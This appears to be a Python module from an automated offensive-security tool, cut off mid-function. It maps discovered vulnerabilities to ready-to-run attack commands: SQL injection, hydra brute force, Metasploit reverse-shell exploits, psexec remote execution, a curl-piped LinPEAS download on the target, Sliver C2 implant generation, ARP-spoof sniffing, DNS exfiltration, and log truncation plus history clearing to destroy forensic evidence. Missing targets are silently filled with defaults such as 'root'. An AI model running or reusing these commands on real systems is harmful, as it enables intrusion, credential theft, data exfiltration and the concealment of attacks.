"""
attack_chain.py - Smart Attack Chain Engine

Maps discovered vulnerabilities to appropriate attack tools with
auto-configured commands. This module provides:

- VULN_TOOL_MAP: Comprehensive mapping of vulnerability types to tools
  with command templates, risk levels, and audit metadata.
- AttackOption / PreparedAttack dataclasses for structured attack planning.
- SmartAttackChain class: analyzes findings, selects tools, generates
  commands, and prepares auditable attack steps.

Usage:
    chain = SmartAttackChain()
    options = chain.analyze_findings(findings)
    prepared = chain.prepare_attack("sqlmap", finding_dict)

Designed for authorized red-team engagements only. All commands include
audit logging and require explicit confirmation before execution.
"""

from __future__ import annotations

import datetime
import logging
import shlex
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class AttackOption:
    """Represents a single viable attack path derived from a finding.

    Attributes:
        tool: Name of the attack tool (e.g. "sqlmap", "hydra").
        category: Broad category (e.g. "exploitation", "brute_force").
        risk_level: Numeric risk 1-10 where 10 is highest.
        description: Human-readable summary of what this attack does.
        command: The ready-to-run command string (or placeholder template).
        requires_check: Pre-flight check required before execution
                        (e.g. "target_reachable", "service_version").
        requires_docker: True if the tool must run inside a Docker container.
        confirmation_required: True if operator must confirm before running.
    """
    tool: str
    category: str
    risk_level: int
    description: str
    command: str
    requires_check: str = ""
    requires_docker: bool = False
    confirmation_required: bool = True


@dataclass
class PreparedAttack:
    """A fully prepared attack ready for execution with audit trail.

    Attributes:
        tool: Attack tool name.
        command: Final command string with resolved placeholders.
        docker_command: Docker-wrapped command if requires_docker, else None.
        description: Human-readable description.
        risk_level: Numeric risk 1-10.
        audit_entry: Dict with timestamp, tool, target, operator placeholder.
    """
    tool: str
    command: str
    docker_command: Optional[str]
    description: str
    risk_level: int
    audit_entry: Dict[str, Any]


# ---------------------------------------------------------------------------
# Vulnerability-to-Tool Mapping
# ---------------------------------------------------------------------------
# Each key is a vulnerability type string. Each value is a dict with:
#   tool              – tool name
#   category          – attack category
#   severity          – severity label (critical/high/medium/low/info)
#   requires          – list of prerequisite checks
#   command_template  – command with {placeholder} named fields
#   description       – human-readable summary
#   risk_level        – numeric 1-10
#   requires_docker   – bool
#   audit_log         – bool (always audit this tool)

VULN_TOOL_MAP: Dict[str, Dict[str, Any]] = {
    # =====================================================================
    # SQL INJECTION
    # =====================================================================
    "SQL_INJECTION": {
        "tool": "sqlmap",
        "category": "exploitation",
        "severity": "critical",
        "requires": ["target_url"],
        "command_template": (
            "sqlmap -u {target_url} --batch --level=3 --risk=2 "
            "--output-dir=/tmp/sqlmap_output --forms --crawl=2 "
            "--random-agent"
        ),
        "description": (
            "Automated SQL injection exploitation with sqlmap in batch mode. "
            "Level 3 injects common headers and cookies; risk 2 adds "
            "time-based and stacked queries."
        ),
        "risk_level": 8,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # XSS
    # =====================================================================
    "XSS_REFLECTED": {
        "tool": "dalfox",
        "category": "exploitation",
        "severity": "high",
        "requires": ["target_url"],
        "command_template": (
            "dalfox url {target_url} --silence --no-color "
            "--output /tmp/dalfox_reflected.txt --skip-bav "
            "--timeout 10 --delay 500"
        ),
        "description": (
            "Reflected XSS scanning with dalfox. Automatically detects "
            "reflected parameters and attempts PoC payload injection."
        ),
        "risk_level": 6,
        "requires_docker": False,
        "audit_log": True,
    },
    "XSS_STORED": {
        "tool": "dalfox",
        "category": "exploitation",
        "severity": "critical",
        "requires": ["target_url"],
        "command_template": (
            "dalfox url {target_url} --silence --no-color "
            "--output /tmp/dalfox_stored.txt --follow-redirects "
            "--timeout 15 --delay 300 --skip-bav --mass"
        ),
        "description": (
            "Stored XSS scanning with dalfox. Uses mass mode to increase "
            "coverage and follows redirects to detect stored injection points."
        ),
        "risk_level": 8,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # WEAK PASSWORDS – HYDRA BRUTE FORCE
    # =====================================================================
    "WEAK_PASSWORD_FTP": {
        "tool": "hydra",
        "category": "brute_force",
        "severity": "high",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "hydra -L /usr/share/wordlists/rockyou.txt "
            "-P /usr/share/wordlists/rockyou.txt "
            "{target_host} ftp -s {target_port} -t 4 -vV "
            "-o /tmp/hydra_ftp_results.txt -f"
        ),
        "description": (
            "FTP brute-force with Hydra using rockyou wordlist for both "
            "usernames and passwords. 4 threads, verbose output, stop on "
            "first valid credential."
        ),
        "risk_level": 7,
        "requires_docker": False,
        "audit_log": True,
    },
    "WEAK_PASSWORD_SSH": {
        "tool": "hydra",
        "category": "brute_force",
        "severity": "high",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "hydra -l {username} -P /usr/share/wordlists/rockyou.txt "
            "{target_host} ssh -s {target_port} -t 4 -vV "
            "-o /tmp/hydra_ssh_results.txt -f"
        ),
        "description": (
            "SSH brute-force with Hydra using rockyou password list. "
            "If no username is known, use -L with a common-user wordlist "
            "instead of -l."
        ),
        "risk_level": 7,
        "requires_docker": False,
        "audit_log": True,
    },
    "WEAK_PASSWORD_TELNET": {
        "tool": "hydra",
        "category": "brute_force",
        "severity": "high",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "hydra -L /usr/share/wordlists/common_users.txt "
            "-P /usr/share/wordlists/rockyou.txt "
            "{target_host} telnet -s {target_port} -t 4 -vV "
            "-o /tmp/hydra_telnet_results.txt -f"
        ),
        "description": (
            "Telnet brute-force with Hydra. Telnet transmits credentials "
            "in cleartext, so even low-quality credentials may be sniffed."
        ),
        "risk_level": 7,
        "requires_docker": False,
        "audit_log": True,
    },
    "WEAK_PASSWORD_RDP": {
        "tool": "hydra",
        "category": "brute_force",
        "severity": "high",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "hydra -l {username} -P /usr/share/wordlists/rockyou.txt "
            "{target_host} rdp -s {target_port} -t 1 -vV "
            "-o /tmp/hydra_rdp_results.txt -f -e nsr"
        ),
        "description": (
            "RDP brute-force with Hydra. Single thread to avoid account "
            "lockouts. Tries null, same-as-user, and username as password."
        ),
        "risk_level": 6,
        "requires_docker": False,
        "audit_log": True,
    },
    "WEAK_PASSWORD_SMB": {
        "tool": "hydra",
        "category": "brute_force",
        "severity": "high",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "hydra -l {username} -P /usr/share/wordlists/rockyou.txt "
            "{target_host} smb -s {target_port} -t 2 -vV "
            "-o /tmp/hydra_smb_results.txt -f"
        ),
        "description": (
            "SMB/CIFS brute-force with Hydra. 2 threads to minimize "
            "noise against domain controllers."
        ),
        "risk_level": 7,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # WORDPRESS
    # =====================================================================
    "WORDPRESS_VULN": {
        "tool": "wpscan",
        "category": "enumeration",
        "severity": "high",
        "requires": ["target_url"],
        "command_template": (
            "wpscan --url {target_url} --enumerate vp,vt,u "
            "--random-user-agent --disable-tls-checks "
            "--no-banner --format cli-no-color "
            "--output /tmp/wpscan_results.txt "
            "--throttle 500"
        ),
        "description": (
            "WordPress vulnerability and enumeration scan with WPScan. "
            "Enumerates vulnerable plugins (vp), vulnerable themes (vt), "
            "and users (u) with throttled requests."
        ),
        "risk_level": 6,
        "requires_docker": False,
        "audit_log": True,
    },
    "WORDPRESS_XMLRPC": {
        "tool": "wpscan",
        "category": "exploitation",
        "severity": "high",
        "requires": ["target_url"],
        "command_template": (
            "wpscan --url {target_url} --enumerate at "
            "--random-user-agent --disable-tls-checks "
            "--no-banner --format cli-no-color "
            "--output /tmp/wpscan_xmlrpc.txt "
            "--throttle 500"
        ),
        "description": (
            "WordPress XML-RPC interface enumeration. The xmlrpc.php "
            "endpoint can be abused for amplification attacks and "
            "brute-force via system.multicall."
        ),
        "risk_level": 6,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # CVE / METASPLOIT
    # =====================================================================
    "CVE_MATCH": {
        "tool": "msfconsole",
        "category": "exploitation",
        "severity": "critical",
        "requires": ["target_host", "target_port", "cve_id"],
        "command_template": (
            "msfconsole -q -x '"
            "use exploit/{exploit_path}; "
            "set RHOSTS {target_host}; "
            "set RPORT {target_port}; "
            "set PAYLOAD {payload}; "
            "set LHOST {listener_host}; "
            "set LPORT {listener_port}; "
            "set LHOST {listener_host}; "
            "exploit -z; "
            "exit'"
        ),
        "description": (
            "Metasploit automated exploit execution for a matched CVE. "
            "Requires the operator to resolve the exploit module path and "
            "appropriate payload for the specific CVE."
        ),
        "risk_level": 10,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # SMB
    # =====================================================================
    "SMB_VULN": {
        "tool": "crackmapexec",
        "category": "exploitation",
        "severity": "critical",
        "requires": ["target_host"],
        "command_template": (
            "crackmapexec smb {target_host} -u '' -p '' "
            "--shares --continue-on-success -v"
        ),
        "description": (
            "SMB null-session enumeration with CrackMapExec. Attempts "
            "empty credential authentication to enumerate shares and "
            "identify misconfigured access controls."
        ),
        "risk_level": 7,
        "requires_docker": False,
        "audit_log": True,
    },
    "SMB_VULN_CRED": {
        "tool": "impacket-psexec",
        "category": "exploitation",
        "severity": "critical",
        "requires": ["target_host", "username", "password", "domain"],
        "command_template": (
            "impacket-psexec {domain}/{username}:{password}@{target_host}"
        ),
        "description": (
            "Remote command execution via SMB with Impacket psexec. "
            "Requires valid domain credentials. Creates a SYSTEM-level "
            "service on the remote host."
        ),
        "risk_level": 10,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # OPEN PORTS – SERVICE-SPECIFIC SCANNING
    # =====================================================================
    "OPEN_PORT_FTP": {
        "tool": "nmap",
        "category": "enumeration",
        "severity": "info",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "nmap -sV -sC -p {target_port} {target_host} "
            "--script=ftp-anon,ftp-syst,ftp-vsftpd-backdoor "
            "-oN /tmp/nmap_ftp_{target_port}.txt"
        ),
        "description": (
            "Nmap service version and default script scan on FTP port. "
            "Checks for anonymous login, system info, and known "
            "backdoors (vsftpd 2.3.4)."
        ),
        "risk_level": 4,
        "requires_docker": False,
        "audit_log": True,
    },
    "OPEN_PORT_SSH": {
        "tool": "nmap",
        "category": "enumeration",
        "severity": "info",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "nmap -sV -sC -p {target_port} {target_host} "
            "--script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods "
            "-oN /tmp/nmap_ssh_{target_port}.txt"
        ),
        "description": (
            "Nmap service version and default script scan on SSH port. "
            "Enumerates supported algorithms, host key, and authentication "
            "methods."
        ),
        "risk_level": 3,
        "requires_docker": False,
        "audit_log": True,
    },
    "OPEN_PORT_TELNET": {
        "tool": "nmap",
        "category": "enumeration",
        "severity": "info",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "nmap -sV -sC -p {target_port} {target_host} "
            "--script=telnet-encryption,telnet-brute "
            "-oN /tmp/nmap_telnet_{target_port}.txt"
        ),
        "description": (
            "Nmap service version and default script scan on Telnet port. "
            "Checks encryption status and attempts brute-force detection."
        ),
        "risk_level": 5,
        "requires_docker": False,
        "audit_log": True,
    },
    "OPEN_PORT_RDP": {
        "tool": "nmap",
        "category": "enumeration",
        "severity": "info",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "nmap -sV -sC -p {target_port} {target_host} "
            "--script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info "
            "-oN /tmp/nmap_rdp_{target_port}.txt"
        ),
        "description": (
            "Nmap service version and default script scan on RDP port. "
            "Checks encryption level, MS12-020 vulnerability, and NTLM info."
        ),
        "risk_level": 4,
        "requires_docker": False,
        "audit_log": True,
    },
    "OPEN_PORT_MYSQL": {
        "tool": "nmap",
        "category": "enumeration",
        "severity": "info",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "nmap -sV -sC -p {target_port} {target_host} "
            "--script=mysql-info,mysql-enum,mysql-empty-password "
            "-oN /tmp/nmap_mysql_{target_port}.txt"
        ),
        "description": (
            "Nmap service version and default script scan on MySQL port. "
            "Checks server info, enumerates databases/users, and tests "
            "for empty root password."
        ),
        "risk_level": 4,
        "requires_docker": False,
        "audit_log": True,
    },
    "OPEN_PORT_POSTGRES": {
        "tool": "nmap",
        "category": "enumeration",
        "severity": "info",
        "requires": ["target_host", "target_port"],
        "command_template": (
            "nmap -sV -sC -p {target_port} {target_host} "
            "--script=pgsql-brute,pg-brute "
            "-oN /tmp/nmap_postgres_{target_port}.txt"
        ),
        "description": (
            "Nmap service version and default script scan on PostgreSQL port. "
            "Attempts default credential brute-force."
        ),
        "risk_level": 4,
        "requires_docker": False,
        "audit_log": True,
    },
    "OPEN_PORT_SMB": {
        "tool": "smbmap",
        "category": "enumeration",
        "severity": "medium",
        "requires": ["target_host"],
        "command_template": (
            "smbmap -H {target_host} -u 'guest' -p '' -R "
            "--no-color -L 2>&1 | tee /tmp/smbmap_{target_host}.txt"
        ),
        "description": (
            "SMB share enumeration with smbmap. Lists all shares with "
            "recursive listing and guest access attempt."
        ),
        "risk_level": 5,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # SUBDOMAIN TAKEOVER
    # =====================================================================
    "SUBDOMAIN_TAKEOVER": {
        "tool": "subzy",
        "category": "exploitation",
        "severity": "high",
        "requires": ["target_domain"],
        "command_template": (
            "subzy run --targets {target_domain} "
            "--concurrency 50 --timeout 15 "
            "--output /tmp/subzy_results.txt"
        ),
        "description": (
            "Subdomain takeover scanning with subzy. Checks for "
            "dangling DNS records pointing to unclaimed services "
            "(GitHub Pages, Heroku, S3, etc.)."
        ),
        "risk_level": 7,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # ADMIN PANEL DISCOVERY
    # =====================================================================
    "ADMIN_PANEL_DISCOVERED": {
        "tool": "dirb",
        "category": "enumeration",
        "severity": "medium",
        "requires": ["target_url"],
        "command_template": (
            "dirb {target_url} /usr/share/wordlists/dirb/common.txt "
            "-r -z 500 -o /tmp/dirb_results.txt"
        ),
        "description": (
            "Directory brute-forcing with dirb using common wordlist. "
            "Recursive mode with 500ms delay between requests."
        ),
        "risk_level": 5,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # EMAIL / DNS ANALYSIS
    # =====================================================================
    "EMAIL_SPOOFING": {
        "tool": "dig",
        "category": "reconnaissance",
        "severity": "medium",
        "requires": ["target_domain"],
        "command_template": (
            "echo '=== MX Records ===' && "
            "dig +short MX {target_domain} && "
            "echo '=== TXT Records (SPF/DKIM) ===' && "
            "dig +short TXT {target_domain} && "
            "echo '=== DMARC Record ===' && "
            "dig +short TXT _dmarc.{target_domain}"
        ),
        "description": (
            "DNS-based email spoofing analysis. Queries MX, TXT (SPF/DKIM), "
            "and DMARC records to identify misconfigurations that allow "
            "email spoofing."
        ),
        "risk_level": 5,
        "requires_docker": False,
        "audit_log": True,
    },
    "DNS_ZONE_TRANSFER": {
        "tool": "dig",
        "category": "reconnaissance",
        "severity": "medium",
        "requires": ["target_domain", "target_host"],
        "command_template": (
            "dig @{target_host} {target_domain} AXFR "
            "+nocmd +noquestion +nostats 2>&1 | tee /tmp/dns_axfr_{target_domain}.txt"
        ),
        "description": (
            "DNS zone transfer attempt against authoritative nameserver. "
            "If successful, reveals the complete zone including all "
            "internal hostnames and IP addresses."
        ),
        "risk_level": 6,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # TLS / SSL
    # =====================================================================
    "TLS_WEAK": {
        "tool": "testssl",
        "category": "misconfiguration",
        "severity": "high",
        "requires": ["target_url"],
        "command_template": (
            "testssl --severity HIGH --quiet --color 0 "
            "-o /tmp/testssl_{target_host}.html "
            "-S -P -U "
            "{target_url}"
        ),
        "description": (
            "TLS/SSL configuration analysis with testssl.sh. Reports "
            "vulnerabilities rated HIGH severity or above including "
            "weak ciphers, deprecated protocols, and certificate issues."
        ),
        "risk_level": 6,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # PRIVILEGE ESCALATION
    # =====================================================================
    "PRIV_ESC_LINUX": {
        "tool": "linpeas",
        "category": "privilege_escalation",
        "severity": "critical",
        "requires": ["target_host", "ssh_user", "ssh_key"],
        "command_template": (
            "ssh -i {ssh_key} {ssh_user}@{target_host} "
            "'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh'"
        ),
        "description": (
            "Automated Linux privilege escalation enumeration with LinPEAS. "
            "Downloads and executes the latest version to identify SUID "
            "binaries, capabilities, cron jobs, and misconfigurations."
        ),
        "risk_level": 9,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # C2 / POST-EXPLOITATION
    # =====================================================================
    "C2_IMPLANT": {
        "tool": "sliver",
        "category": "post_exploitation",
        "severity": "critical",
        "requires": ["listener_host", "listener_port"],
        "command_template": (
            "sliver-server --headless -c /etc/sliver/config.json -e '"
            "generate --mtls {listener_host}:{listener_port} "
            "--os linux --arch amd64 --save /tmp/implant "
            "--name auto_generated'"
        ),
        "description": (
            "Generate a Sliver C2 implant binary for Linux amd64 via mTLS "
            "listener. The implant must be transferred to and executed on "
            "the target host."
        ),
        "risk_level": 10,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # PASSWORD CRACKING
    # =====================================================================
    "PASSWORD_CRACK_HASHCAT": {
        "tool": "hashcat",
        "category": "password_cracking",
        "severity": "high",
        "requires": ["hash_file", "hash_mode"],
        "command_template": (
            "hashcat -m {hash_mode} -a 0 {hash_file} "
            "/usr/share/wordlists/rockyou.txt "
            "--potfile-path=/tmp/hashcat.pot "
            "--outfile=/tmp/hashcat_results.txt "
            "--status --status-timer=10"
        ),
        "description": (
            "GPU-accelerated password cracking with hashcat. Requires "
            "hash_mode (-m) matching the hash type (e.g. 0=MD5, 1000=NTLM, "
            "1800=sha512crypt). Uses rockyou wordlist with no rules."
        ),
        "risk_level": 7,
        "requires_docker": False,
        "audit_log": True,
    },
    "PASSWORD_CRACK_JOHN": {
        "tool": "john",
        "category": "password_cracking",
        "severity": "high",
        "requires": ["hash_file"],
        "command_template": (
            "john --wordlist=/usr/share/wordlists/rockyou.txt "
            "--format={hash_format} "
            "--pot=/tmp/john.pot "
            "{hash_file} 2>&1 | tee /tmp/john_results.txt"
        ),
        "description": (
            "Password cracking with John the Ripper. Auto-detects hash "
            "format when possible. Supports NT, crypt, md5, sha256, sha512, "
            "and many more formats."
        ),
        "risk_level": 7,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # NETWORK ATTACKS
    # =====================================================================
    "ARP_SPOOF": {
        "tool": "bettercap",
        "category": "network_attack",
        "severity": "high",
        "requires": ["target_host", "gateway"],
        "command_template": (
            "bettercap -eval '"
            "set arp.spoof.targets {target_host}; "
            "set arp.spoof.fullduplex true; "
            "arp.spoof on; "
            "net.sniff on; "
            "set net.sniff.verbose true;"
        ),
        "description": (
            "ARP spoofing with bettercap to perform man-in-the-middle "
            "attack. Redirects traffic from the target through the "
            "attacker machine for sniffing."
        ),
        "risk_level": 8,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # DATA EXFILTRATION
    # =====================================================================
    "DATA_EXFIL_DNS": {
        "tool": "dnscat2",
        "category": "data_exfiltration",
        "severity": "critical",
        "requires": ["attacker_ip"],
        "command_template": (
            "dnscat2-server --security=open {attacker_ip} "
            "--maxpacket=1024 --banning --no-cache"
        ),
        "description": (
            "Start a dnscat2 server for DNS-based data exfiltration. "
            "Encodes data within DNS queries/responses to bypass "
            "network monitoring. Requires DNS server pointing to attacker."
        ),
        "risk_level": 9,
        "requires_docker": False,
        "audit_log": True,
    },

    # =====================================================================
    # LOG CLEANUP / ANTI-FORENSICS
    # =====================================================================
    "LOG_CLEANUP": {
        "tool": "truncate",
        "category": "anti_forensics",
        "severity": "critical",
        "requires": ["target_host", "log_files"],
        "command_template": (
            "truncate -s 0 "
            "/var/log/auth.log "
            "/var/log/syslog "
            "/var/log/secure "
            "/var/log/wtmp "
            "/var/log/lastlog "
            "2>/dev/null; "
            "history -c && history -w"
        ),
        "description": (
            "Truncate common Linux log files and clear shell history. "
            "Destructive operation used to remove forensic evidence."
        ),
        "risk_level": 10,
        "requires_docker": False,
        "audit_log": True,
    },
}


# ---------------------------------------------------------------------------
# Helper constants
# ---------------------------------------------------------------------------

# Confirmation-required risk threshold: attacks at or above this level
# need explicit operator approval before execution.
CONFIRMATION_THRESHOLD: int = 7

# Docker image map for tools that can be containerized
DOCKER_IMAGES: Dict[str, str] = {
    "sqlmap": "paoloo/sqlmap:latest",
    "hydra": "dfinnis/hydra:latest",
    "nmap": "instrumentisto/nmap:latest",
    "crackmapexec": "byt3bl33d3r/crackmapexec:latest",
    "wpscan": "wpscanteam/wpscan:latest",
    "hashcat": "dizcza/docker-hashcat:latest",
    "john": "friz0015/john:latest",
    "bettercap": "bettercap/bettercap:latest",
    "smbmap": "infuguay/smbmap:latest",
    "testssl": "drwetter/testssl.sh:latest",
    "dirb": "secfigo/dirb:latest",
    "subzy": "laki8/subzy:latest",
}

# Category to color mapping for terminal output (not required but useful)
CATEGORY_LABELS: Dict[str, str] = {
    "exploitation": "EXPLOIT",
    "brute_force": "BRUTE",
    "enumeration": "ENUM",
    "reconnaissance": "RECON",
    "misconfiguration": "MISCONFIG",
    "privilege_escalation": "PRIVESC",
    "post_exploitation": "POST-EXP",
    "password_cracking": "PASSCRACK",
    "network_attack": "NET-ATTACK",
    "data_exfiltration": "EXFIL",
    "anti_forensics": "ANTI-FORENSICS",
}


# ---------------------------------------------------------------------------
# SmartAttackChain
# ---------------------------------------------------------------------------

class SmartAttackChain:
    """Engine that maps vulnerability findings to actionable attack tools.

    Maintains the VULN_TOOL_MAP, resolves command templates with target
    information, wraps Docker commands where required, and generates
    audit-trail entries for every prepared attack.

    Example::

        chain = SmartAttackChain()

        findings = [
            {"type": "SQL_INJECTION", "url": "https://target.com/page?id=1"},
            {"type": "WEAK_PASSWORD_SSH", "host": "10.0.0.5", "port": "22",
             "username": "admin"},
        ]

        for finding in findings:
            options = chain.get_attack_options(finding)
            for opt in options:
                print(f"{opt.tool}: {opt.command}")
    """

    def __init__(
        self,
        vuln_tool_map: Optional[Dict[str, Dict[str, Any]]] = None,
        confirmation_threshold: int = CONFIRMATION_THRESHOLD,
        dry_run: bool = True,
    ) -> None:
        """Initialise the attack chain engine.

        Args:
            vuln_tool_map: Override the default VULN_TOOL_MAP with a custom
                           mapping. Primarily used for testing.
            confirmation_threshold: Risk level at or above which operator
                                    confirmation is mandatory.
            dry_run: If True (default), all generated commands are logged
                     but marked as requiring confirmation. Set to False
                     only in controlled lab environments.
        """
        self.vuln_tool_map = vuln_tool_map or VULN_TOOL_MAP
        self.confirmation_threshold = confirmation_threshold
        self.dry_run = dry_run
        self._prepared_count: int = 0

    # -----------------------------------------------------------------
    # Auto-detection from scanner findings
    # -----------------------------------------------------------------

    # Keyword → vulnerability type mapping
    _KEYWORD_MAP = {
        "sql injection": "SQL_INJECTION",
        "sqli": "SQL_INJECTION",
        "xss": "XSS_REFLECTED",
        "cross-site scripting": "XSS_REFLECTED",
        "weak password": "WEAK_PASSWORD_SSH",
        "brute force": "WEAK_PASSWORD_SSH",
        "wordpress": "WORDPRESS_VULN",
        "wp-": "WORDPRESS_VULN",
        "xmlrpc": "WORDPRESS_XMLRPC",
        "cve-": "CVE_MATCH",
        "remote code execution": "CVE_MATCH",
        "rce": "CVE_MATCH",
        "smb": "SMB_VULN",
        "microsoft-ds": "SMB_VULN",
        "netbios": "SMB_VULN",
        "subdomain takeover": "SUBDOMAIN_TAKEOVER",
        "admin panel": "ADMIN_PANEL_DISCOVERED",
        "cpanel": "ADMIN_PANEL_DISCOVERED",
        "wp-admin": "ADMIN_PANEL_DISCOVERED",
        "email spoof": "EMAIL_SPOOFING",
        "dmarc": "EMAIL_SPOOFING",
        "tls": "TLS_WEAK",
        "ssl": "TLS_WEAK",
        "certificate": "TLS_WEAK",
        "dns zone": "DNS_ZONE_TRANSFER",
        "ftp": "OPEN_PORT_FTP",
        "ssh": "OPEN_PORT_SSH",
        "telnet": "OPEN_PORT_TELNET",
        "rdp": "OPEN_PORT_RDP",
        "ms-wbt": "OPEN_PORT_RDP",
        "mysql": "OPEN_PORT_MYSQL",
        "postgres": "OPEN_PORT_POSTGRES",
        "open port": "OPEN_PORT_SSH",
    }

    def _detect_type_from_finding(self, finding: Dict[str, Any]) -> str:
        """Auto-detect vulnerability type from finding title/content."""
        # Check for explicit type field first
        explicit = finding.get("type", "")
        if explicit and explicit in self.vuln_tool_map:
            return explicit

        # Search title and other text fields
        text = " ".join(str(v) for v in finding.values()).lower()
        for keyword, vuln_type in self._KEYWORD_MAP.items():
            if keyword in text:
                return vuln_type
        return ""

    # -----------------------------------------------------------------
    # Public API
    # -----------------------------------------------------------------

    def analyze_findings(
        self, findings_list: List[Dict[str, Any]]
    ) -> List[AttackOption]:
        """Analyze a list of findings and return all viable attack options.

        Each finding dict must contain at minimum a ``type`` key matching
        one of the VULN_TOOL_MAP entries. Additional keys provide target
        information used to populate command templates.

        Args:
            findings_list: List of finding dicts from the scanner.

        Returns:
            Flat list of AttackOption objects, one per viable attack path.
            Findings with no matching tool are logged and skipped.
        """
        all_options: List[AttackOption] = []

        for finding in findings_list:
            options = self.get_attack_options(finding)
            all_options.extend(options)

        logger.info(
            "Analyzed %d findings -> %d attack options",
            len(findings_list),
            len(all_options),
        )
        return all_options

    def get_attack_options(self, finding_dict: Dict[str, Any]) -> List[AttackOption]:
        """Return attack options for a single finding.

        Auto-detects vulnerability type from finding title/content if no
        explicit ``type`` key is present. Looks up the detected type in
        VULN_TOOL_MAP and builds an AttackOption with a generated command.
        """
        vuln_type = self._detect_type_from_finding(finding_dict)
        if not vuln_type:
            return []

        mapping = self.vuln_tool_map.get(vuln_type)
        if mapping is None:
            return []

        # Resolve the command template with target information
        target_info = self._extract_target_info(finding_dict)
        command = self.generate_command(mapping, target_info)

        # Determine if Docker wrapper is needed
        requires_docker = mapping.get("requires_docker", False)

        # Determine confirmation requirement
        risk_level = mapping.get("risk_level", 5)
        confirmation_required = (
            risk_level >= self.confirmation_threshold or self.dry_run
        )

        option = AttackOption(
            tool=mapping["tool"],
            category=mapping["category"],
            risk_level=risk_level,
            description=mapping["description"],
            command=command,
            requires_check=",".join(mapping.get("requires", [])),
            requires_docker=requires_docker,
            confirmation_required=confirmation_required,
        )

        logger.debug(
            "Generated attack option: %s (risk=%d, docker=%s)",
            option.tool,
            option.risk_level,
            option.requires_docker,
        )
        return [option]

    def generate_command(
        self,
        tool_config: Dict[str, Any],
        target_info: Dict[str, str],
    ) -> str:
        """Generate a command string from a tool config and target info.

        Resolves ``{placeholder}`` fields in the command_template. If
        a placeholder is missing from target_info, it is replaced with
        a ``<UNSET_FIELD>`` marker and a warning is logged.

        Args:
            tool_config: A VULN_TOOL_MAP value dict.
            target_info: Dict mapping placeholder names to values.

        Returns:
            Resolved command string.
        """
        template = tool_config.get("command_template", "")
        required_fields = tool_config.get("requires", [])

        # Collect all placeholders in the template
        import re
        placeholders = re.findall(r"\{(\w+)\}", template)

        # Build the format kwargs, warning on missing fields
        fmt_kwargs: Dict[str, str] = {}
        for ph in placeholders:
            if ph in target_info:
                fmt_kwargs[ph] = target_info[ph]
            else:
                logger.warning(
                    "Placeholder '%s' not found in target_info; "
                    "using <UNSET_FIELD> marker",
                    ph,
                )
                fmt_kwargs[ph] = f"<UNSET_{ph.upper()}>"

        try:
            command = template.format(**fmt_kwargs)
        except KeyError as exc:
            logger.error("Missing template key: %s", exc)
            command = f"# ERROR: Could not resolve template – missing key {exc}"

        # Never hand the operator a command containing <UNSET_...> markers:
        # substitute Kali-grade defaults the operator can edit in-terminal.
        if "<UNSET_" in command:
            import re as _re
            command = command.replace(
                "-l <UNSET_USERNAME>",
                "-L /usr/share/metasploit-framework/data/wordlists/unix_users.txt")
            _svc_ports = {"ssh": "22", "ftp": "21", "telnet": "23",
                          "rdp": "3389", "mysql": "3306", "mssql": "1433"}
            _port = _svc_ports.get(str(tool_config.get("tool", "")), "")
            if "<UNSET_TARGET_PORT>" in command:
                if _port:
                    command = command.replace("<UNSET_TARGET_PORT>", _port)
                else:
                    command = _re.sub(r"\s+-s\s+<UNSET_TARGET_PORT>", "", command)
            # drop any other flag that still carries an unset marker
            command = _re.sub(r"\s+--?[a-zA-Z][\w-]*\s+<UNSET_[A-Z_]+>", "", command)
            command = command.replace("<UNSET_USERNAME>", "root")

        return command

    def prepare_attack(
        self, tool_name: str, finding_dict: Dict[str, Any]
    ) -> PreparedAttack:
        """Prepare a full attack step for a specific tool and finding.

        Resolves the command, wraps it in Docker if needed, generates
        an audit entry, and returns a PreparedAttack ready for review
        or execution.

        Args:
            tool_name: Name of the tool to prepare (must exist in map).
            finding_dict: Finding dict with target information.

        Returns:
            PreparedAttack with resolved command and audit metadata.

        Raises:
            ValueError: If tool_name is not found in VULN_TOOL_MAP.
        """
        mapping = None
        for _vuln_type, config in self.vuln_tool_map.items():
            if config["tool"] == tool_name:
                mapping = config
                break

        # Also allow lookup by vuln type directly
        if mapping is None:
            mapping = self.vuln_tool_map.get(tool_name)

        if mapping is None:
            raise ValueError(
                f"Tool '{tool_name}' not found in VULN_TOOL_MAP"
            )

        target_info = self._extract_target_info(finding_dict)
        command = self.generate_command(mapping, target_info)

        # Build Docker wrapper if needed
        docker_command: Optional[str] = None
        if mapping.get("requires_docker", False):
            docker_image = DOCKER_IMAGES.get(
                mapping["tool"], f"{mapping['tool']}:latest"
            )
            docker_command = (
                f"docker run --rm --network host "
                f"-v /tmp:/tmp {docker_image} "
                f"{command}"
            )

        # Generate audit entry
        audit_entry = self._build_audit_entry(
            tool=mapping["tool"],
            command=command,
